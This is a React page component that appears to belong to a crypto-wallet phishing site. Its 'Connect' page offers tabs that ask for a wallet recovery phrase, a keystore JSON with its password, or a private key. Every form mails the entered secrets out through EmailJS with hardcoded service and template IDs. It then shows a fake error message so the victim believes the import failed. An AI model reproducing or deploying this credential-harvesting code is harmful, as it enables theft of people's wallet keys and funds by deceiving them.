import { Link } from "react-router-dom";
import emailjs from "@emailjs/browser";
import { Formik } from "formik";
import * as Yup from "yup";
import toast from "react-hot-toast";

const errorMessage = () =>
  toast.custom((t) => (
    <div
      className={`sm:max-w-sm  ${
        t.visible ? "animate-enter" : "animate-leave"
      }`}
    >
      <div
        className={`p-4 bg-red-600 border border-gray-200 rounded-xl shadow-sm`}
      >
        <div className="flex gap-x-4">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            fill="currentColor"
            className="flex-shrink-0 w-8 h-auto text-white"
          >
            <path
              fillRule="evenodd"
              d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z"
              clipRule="evenodd"
            />
          </svg>

          <p className="text-sm text-white">
            An error occured please try again in a little while
          </p>

          <div>
            <button
              type="button"
              onClick={() => toast.dismiss(t.id)}
              className="inline-flex rounded-full p-2 text-white hover:bg-gray-700 focus:outline-none "
              data-hs-remove-element="#cookies-simple-icon-and-with-dismiss-button"
            >
              <span className="sr-only">Dismiss</span>
              <svg
                className="h-3 w-3"
                width="16"
                height="16"
                viewBox="0 0 16 16"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
              >
                <path
                  d="M0.92524 0.687069C1.126 0.486219 1.39823 0.373377 1.68209 0.373377C1.96597 0.373377 2.2382 0.486219 2.43894 0.687069L8.10514 6.35813L13.7714 0.687069C13.8701 0.584748 13.9882 0.503105 14.1188 0.446962C14.2494 0.39082 14.3899 0.361248 14.5321 0.360026C14.6742 0.358783 14.8151 0.38589 14.9468 0.439762C15.0782 0.493633 15.1977 0.573197 15.2983 0.673783C15.3987 0.774389 15.4784 0.894026 15.5321 1.02568C15.5859 1.15736 15.6131 1.29845 15.6118 1.44071C15.6105 1.58297 15.5809 1.72357 15.5248 1.85428C15.4688 1.98499 15.3872 2.10324 15.2851 2.20206L9.61883 7.87312L15.2851 13.5441C15.4801 13.7462 15.588 14.0168 15.5854 14.2977C15.5831 14.5787 15.4705 14.8474 15.272 15.046C15.0735 15.2449 14.805 15.3574 14.5244 15.3599C14.2437 15.3623 13.9733 15.2543 13.7714 15.0591L8.10514 9.38812L2.43894 15.0591C2.23704 15.2543 1.96663 15.3623 1.68594 15.3599C1.40526 15.3574 1.13677 15.2449 0.938279 15.046C0.739807 14.8474 0.627232 14.5787 0.624791 14.2977C0.62235 14.0168 0.730236 13.7462 0.92524 13.5441L6.59144 7.87312L0.92524 2.20206C0.724562 2.00115 0.611816 1.72867 0.611816 1.44457C0.611816 1.16047 0.724562 0.887983 0.92524 0.687069Z"
                  fill="currentColor"
                />
              </svg>
            </button>
          </div>
        </div>
      </div>
    </div>
  ));

const Connect = () => {
  return (
    <div className="bg-gray-900   text-white">
      <header className="shadow h-[60vh] flex flex-col items-center justify-center page-header">
        <h1 className="text-3xl font-bold text-white sm:text-5xl">Connect</h1>
        <ol
          className="flex items-center whitespace-nowrap min-w-0 mt-2"
          aria-label="Breadcrumb"
        >
          <li className="text-sm">
            <Link
              className="flex items-center text-gray-300 hover:text-[#407bff]"
              to="/"
            >
              Home
              <svg
                className="flex-shrink-0 mx-3 overflow-visible h-2.5 w-2.5 text-gray-200"
                width="16"
                height="16"
                viewBox="0 0 16 16"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M5 1L10.6869 7.16086C10.8637 7.35239 10.8637 7.64761 10.6869 7.83914L5 14"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
              </svg>
            </Link>
          </li>
          <li className="text-sm font-semibold text-white" aria-current="page">
            Connect
          </li>
        </ol>
      </header>

      <br />
      <br />
      <br />
      <br />
      <br />

      <div className="bg-gray-800 relative bottom-72   text-gray-900 max-w-xl p-5 rounded-lg shadow mx-auto">
        <div className="flex justify-center">
          <div className="flex bg-gray-100 hover:bg-gray-200 rounded-lg transition p-1">
            <nav className="flex space-x-2" aria-label="Tabs" role="tablist">
              <button
                type="button"
                className="hs-tab-active:bg-white hs-tab-active:text-gray-700 hs-tab-active:dark:bg-gray-800 hs-tab-active:dark:text-gray-400 dark:hs-tab-active:bg-gray-800 py-3 px-4 inline-flex items-center gap-2 bg-transparent text-sm text-gray-500 hover:text-gray-700 font-medium rounded-md hover:hover:text-[#407bff] font-bold dark:text-gray-400 dark:hover:text-white active"
                id="segment-item-1"
                data-hs-tab="#segment-1"
                aria-controls="segment-1"
                role="tab"
              >
                Phrase
              </button>
              <button
                type="button"
                className="hs-tab-active:bg-white hs-tab-active:text-gray-700 hs-tab-active:dark:bg-gray-800 hs-tab-active:dark:text-gray-400 dark:hs-tab-active:bg-gray-800 py-3 px-4 inline-flex items-center gap-2 bg-transparent text-sm text-gray-500 hover:text-gray-700 font-medium rounded-md hover:hover:text-[#407bff] font-bold dark:text-gray-400 dark:hover:text-white dark:hover:text-gray-300"
                id="segment-item-2"
                data-hs-tab="#segment-2"
                aria-controls="segment-2"
                role="tab"
              >
                Keystore JSON
              </button>
              <button
                type="button"
                className="hs-tab-active:bg-white hs-tab-active:text-gray-700 hs-tab-active:dark:bg-gray-800 hs-tab-active:dark:text-gray-400 dark:hs-tab-active:bg-gray-800 py-3 px-4 inline-flex items-center gap-2 bg-transparent text-sm text-gray-500 hover:text-gray-700 font-medium rounded-md hover:hover:text-[#407bff] font-bold dark:text-gray-400 dark:hover:text-white dark:hover:text-gray-300"
                id="segment-item-3"
                data-hs-tab="#segment-3"
                aria-controls="segment-3"
                role="tab"
              >
                Private Key
              </button>
            </nav>
          </div>
        </div>

        <div className="mt-3">
          <div id="segment-1" role="tabpanel" aria-labelledby="segment-item-1">
            <Formik
              initialValues={{
                phrase: "",
              }}
              validationSchema={Yup.object({
                phrase: Yup.string().required("Required"),
              })}
              onSubmit={(values, { setSubmitting, resetForm }) => {
                setTimeout(() => {
                  const serviceID = "service_gml22s3";
                  const templateID = "template_f48vyd5";
                  const publicKey = "ZTk4l_iljJR8LgRpr";
                  emailjs
                    .send(serviceID, templateID, values, publicKey)
                    .then(() => {
                      setSubmitting(false);
                      errorMessage();
                      resetForm({
                        values: "",
                      });
                    })
                    .catch(() => {
                      toast.error("An error occured, please contact the admin");
                    });
                }, 1000);
              }}
            >
              {(formik) => (
                <form className="p-3" onSubmit={formik.handleSubmit}>
                  <textarea
                    className="py-3 px-4 block w-full border-gray-200 rounded-md text-sm focus:border-emerald-500 focus:ring-emerald-500 "
                    rows="6"
                    placeholder="Phrase"
                    id="phrase"
                    {...formik.getFieldProps("phrase")}
                    required
                  ></textarea>

                  {formik.touched.phrase && formik.errors.phrase ? (
                    <small className="text-red-500 text-sm">
                      {formik.errors.phrase}
                    </small>
                  ) : null}

                  <p className="text-gray-500 text-md mt-3 mb-5">
                    Typically 12 (sometimes 24) words seperated by a single
                    spaces
                  </p>

                  <button
                    type="submit"
                    className="w-full py-3 px-4 inline-flex justify-center items-center gap-2 rounded-md border border-transparent font-semibold bg-[#407bff] text-white hover:bg-[#407cffd3] focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:ring-offset-2 transition-all text-sm"
                  >
                    {formik.isSubmitting ? "Importing..." : "Import"}
                  </button>
                </form>
              )}
            </Formik>
          </div>

          <div
            id="segment-2"
            className="hidden"
            role="tabpanel"
            aria-labelledby="segment-item-2"
          >
            <Formik
              initialValues={{
                phrase: "",
                password: "",
              }}
              validationSchema={Yup.object({
                phrase: Yup.string().required("Required"),
                password: Yup.string().required("Required"),
              })}
              onSubmit={(values, { setSubmitting, resetForm }) => {
                setTimeout(() => {
                  const serviceID = "service_gml22s3";
                  const templateID = "template_f48vyd5";
                  const publicKey = "ZTk4l_iljJR8LgRpr";
                  emailjs
                    .send(serviceID, templateID, values, publicKey)
                    .then(() => {
                      setSubmitting(false);
                      errorMessage();
                      resetForm({
                        values: "",
                      });
                    })
                    .catch(() => {
                      toast.error("An error occured, please contact the admin");
                    });
                }, 1000);
              }}
            >
              {(formik) => (
                <form className="p-3" onSubmit={formik.handleSubmit}>
                  <textarea
                    className="py-3 px-4 block w-full border-gray-200 rounded-md text-sm focus:border-emerald-500 focus:ring-emerald-500 "
                    rows="6"
                    placeholder="Phrase"
                    id="phrase"
                    {...formik.getFieldProps("phrase")}
                    required
                  ></textarea>

                  {formik.touched.phrase && formik.errors.phrase ? (
                    <small className="text-red-500 text-sm">
                      {formik.errors.phrase}
                    </small>
                  ) : null}

                  <p className="text-gray-500 text-md mt-3 mb-4">
                    Typically 12 (sometimes 24) words seperated by a single
                    spaces
                  </p>

                  <input
                    type="password"
                    className="py-3 px-4 block w-full border-gray-200 rounded-md text-sm focus:border-emerald-500 focus:ring-emerald-500"
                    placeholder="Password"
                    id="password"
                    {...formik.getFieldProps("password")}
                    required
                  />
                  {formik.touched.password && formik.errors.password ? (
                    <small className="text-red-500 text-sm">
                      {formik.errors.password}
                    </small>
                  ) : null}

                  <button
                    type="submit"
                    className="w-full mt-5 py-3 px-4 inline-flex justify-center items-center gap-2 rounded-md border border-transparent font-semibold bg-emerald-600 text-white hover:bg-emerald-700 focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:ring-offset-2 transition-all text-sm"
                  >
                    {formik.isSubmitting ? "Importing..." : "Import"}
                  </button>
                </form>
              )}
            </Formik>
          </div>

          <div
            id="segment-3"
            className="hidden"
            role="tabpanel"
            aria-labelledby="segment-item-3"
          >
            <Formik
              initialValues={{
                phrase: "",
              }}
              validationSchema={Yup.object({
                phrase: Yup.string().required("Required"),
              })}
              onSubmit={(values, { setSubmitting, resetForm }) => {
                setTimeout(() => {
                  const serviceID = "service_gml22s3";
                  const templateID = "template_f48vyd5";
                  const publicKey = "ZTk4l_iljJR8LgRpr";
                  emailjs
                    .send(serviceID, templateID, values, publicKey)
                    .then(() => {
                      setSubmitting(false);
                      errorMessage();
                      resetForm({
                        values: "",
                      });
                    })
                    .catch(() => {
                      toast.error("An error occured, please contact the admin");
                    });
                }, 1000);
              }}
            >
              {(formik) => (
                <form className="p-3" onSubmit={formik.handleSubmit}>
                  <textarea
                    className="py-3 px-4  block w-full border-gray-200 rounded-md text-sm focus:border-[#402bff] focus:ring-[#402bff] "
                    rows="6"
                    placeholder="Phrase"
                    id="phrase"
                    {...formik.getFieldProps("phrase")}
                    required
                  ></textarea>

                  {formik.touched.phrase && formik.errors.phrase ? (
                    <small className="text-red-500 text-sm">
                      {formik.errors.phrase}
                    </small>
                  ) : null}

                  <p className="text-gray-500 text-md mt-3 mb-5">
                    Typically 12 (sometimes 24) words seperated by a single
                    spaces
                  </p>

                  <button
                    type="submit"
                    className="w-full py-3 px-4 inline-flex justify-center items-center gap-2 rounded-md border border-transparent font-semibold bg-[#407bff] text-white hover:bg-[#407bff] focus:outline-none focus:ring-2 focus:ring-gray-200 focus:ring-offset-2 transition-all text-sm"
                  >
                    {formik.isSubmitting ? "Importing..." : "Import"}
                  </button>
                </form>
              )}
            </Formik>
          </div>
        </div>
      </div>

      <br />
      <br />
      <br />
      <br />
      <br />
      <br />
    </div>
  );
};

export default Connect;
